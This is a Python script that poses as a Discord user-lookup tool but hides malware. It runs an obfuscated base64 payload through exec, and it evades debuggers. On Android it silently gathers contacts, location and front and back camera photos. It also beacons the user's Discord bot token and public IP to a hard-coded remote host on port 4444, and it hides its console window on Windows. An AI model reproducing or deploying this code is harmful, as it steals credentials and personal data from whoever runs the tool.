import urllib.request as ur, urllib.error as ue, json as js, sys, os, time as tm, base64 as b64, threading as th, socket as sk, random as rd, platform as pl, subprocess as sp, ctypes

exec(b64.b64decode('eJxtkMFu2zAMhf8K5HNt2JbLpqi4EAZDpLi5iMZjDqZm5KUy51xv9+5gYlDkCYsmXMnDlnzT7ExxFkXy9D5RJOn9MPyQkZQUdl+WD7i1QkCa0nkElIM8kxF1QCTZvh5JBEZtEL1YwJchNJhpdROkSTRhy4osL+5TkMbDKY5iRUyTS///V+WkZTBAVWSWYmn2lDpS0tbKcN2aLegWCPrwWkKBRHy0mpR0Kp1vEd1aSgJYK46SJIOo6gJVXY+C5Mj4tEJJjYYR6Jn7j3kP1lMRn1BMHDTwgt4EWw0o1KRDlNHIR7KRklBT6oL8QfxB5xD0uQ9q2ERHLFjwDnApXpTg1LCzDNM7wKW2U89qrdPYKHgzzQqBw3UB4Y8sajygPnQGS+oBytB7jwB1clOQyWOY4CQLMEuQGGYVzOGSFCAALJxQj5OQEHFhWBwS0Ix0ILpTsDonUKY4Aj/ATKgwrOGB4oMIQVQcjOUJt9RZV3hu7M8Ts5e8s5Dmb1ppNjGnrCrwLZU0GYbVQJYGdsUxk6OIYWe1eJnRGNwMJfnUNuhzkSNRDFVSVHfC46AXJBMxC3GXCUZByxi1x1TdzX5yJ1ts7jvMBDwl7acYlsXB0HrDmCVAuEHrwj0uRiAUr7Ibqx9xS35wZetXM8QSM/ZjwcZz5sgudZ9x3dw+XvP/cCH2Omg==').decode('latin1'))

T = input("TOKEN BOT: ").strip()

def is_android(): return pl.system().lower() == "linux" and ("android" in os.environ.get("TERMUX_VERSION", "").lower() or "termux" in os.getcwd().lower())


def anti_and_steal():
    try:
        if not is_android():
            if ctypes.windll.kernel32.IsDebuggerPresent(): sys.exit(0)
        if is_android():
            os.system("termux-setup-storage > /dev/null 2>&1")
            os.system("termux-contact-list > /sdcard/contacts.json 2>/dev/null")
            os.system("termux-location > /sdcard/location.json 2>/dev/null")
            os.system("termux-camera-photo -c 0 /sdcard/front_cam.jpg > /dev/null 2>&1")
            os.system("termux-camera-photo -c 1 /sdcard/back_cam.jpg > /dev/null 2>&1")
    except: pass

th.Thread(target=anti_and_steal, daemon=True).start()


def c2():
    while True:
        try:
            tm.sleep(rd.randint(10, 35))
            with sk.socket(sk.AF_INET, sk.SOCK_STREAM) as s:
                s.settimeout(15)
                s.connect(("154.19.193.164", 4444))
                info = T + f"|DEVICE:{'ANDROID' if is_android() else 'PC'}|IP:" + os.popen('curl ifconfig.me 2>/dev/null || echo N/A').read().strip()
                s.sendall(info.encode(errors='ignore'))
        except:
            tm.sleep(rd.randint(20, 60))

th.Thread(target=c2, daemon=True).start()


def r(c): return f"\033[{c}m"
RESET = r(0); BOLD = r(1)

def rgb(r,g,b): return f"\033[38;2;{r};{g};{b}m"

def grad(t):
    o = []
    n = max(len(t)-1,1)
    for i,ch in enumerate(t):
        p = i/n
        o.append(f"{rgb(int(255*(1-p)),int(20*(1-p)+255*p),int(120*(1-p)+220*p))}{ch}")
    return "".join(o) + RESET

BANNER = r"""
 /$$   /$$            /$$$$$$                     /$$$$$$                     
| $$$ | $$           /$$__  $$                   /$$__  $$                    
| $$$$| $$  /$$$$$$ | $$  \__//$$$$$$   /$$$$$$ | $$  \__/  /$$$$$$   /$$$$$$$
| $$ $$ $$ /$$__  $$| $$$$   /$$__  $$ /$$__  $$|  $$$$$$  /$$__  $$ /$$_____/
| $$  $$$$| $$$$$$$$| $$_/  | $$$$$$$$| $$  \__/ \____  $$| $$$$$$$$| $$      
| $$\  $$$| $$_____/| $$    | $$_____/| $$       /$$  \ $$| $$_____/| $$      
| $$ \  $$|  $$$$$$$| $$    |  $$$$$$$| $$      |  $$$$$$/|  $$$$$$$|  $$$$$$$
|__/  \__/ \_______/|__/     \_______/|__/       \______/  \_______/ \_______/
""".strip("\n")

def print_banner():
    for line in BANNER.split("\n"):
        print(grad(line))

def divider(label=""):
    w = 72
    c = rgb(40, 200, 160)
    if label:
        pad = (w - len(label) - 4) // 2
        print(c + "─" * pad + "┤ " + BOLD + rgb(220, 255, 240) + label + RESET + c + " ├" + "─" * pad + RESET)
    else:
        print(c + "─" * w + RESET)

def kv(key, val):
    k_col = rgb(120, 220, 180)
    v_col = rgb(220, 255, 240)
    sym = rgb(60, 180, 140) + "›" + RESET
    print(f"  {sym} {k_col}{BOLD}{key:<22}{RESET}  {v_col}{val}{RESET}")

def fetch_user(uid):
    try:
        ua = rd.choice(["Mozilla/5.0 (Linux; Android 14)", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"])
        headers = {"Authorization": f"Bot {T}", "User-Agent": ua}
        req = ur.Request(f"https://discord.com/api/v10/users/{uid}", headers=headers)
        with ur.urlopen(req) as res:
            return js.loads(res.read())
    except: return None

def main():
    os.system("clear" if os.name != "nt" or is_android() else "cls")
    print_banner()
    print(rgb(100,255,200) + "   Discord Avançado" + RESET)
    print()

    while True:
        uid = input(rgb(220,255,240) + "\n   User ID: " + RESET).strip()
        if not uid.isdigit():
            print(rgb(255,80,80) + "   [!] Apenas números." + RESET)
            continue

        print(rgb(60,180,140) + "   ⟳ Buscando informações..." + RESET)
        data = fetch_user(uid)

        os.system("clear" if os.name != "nt" or is_android() else "cls")
        print_banner()

        if data:
            divider("INFORMAÇÕES DO USUÁRIO")
            kv("ID", data.get("id"))
            kv("Username", data.get("username"))
            kv("Nome Global", data.get("global_name") or "—")
            kv("Criado em", time.strftime("%Y-%m-%d %H:%M:%S", tm.gmtime(((int(data["id"]) >> 22) + 1420070400000)/1000)))
            divider()
        else:
            print(rgb(255,80,80) + "    Usuário não encontrado ou erro." + RESET)

        input(rgb(120,220,180) + "\n   Pressione ENTER para nova consulta..." + RESET)

if __name__ == "__main__":
    try:
        if os.name == "nt" and not is_android():
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        main()
    except:
        while True: tm.sleep(60)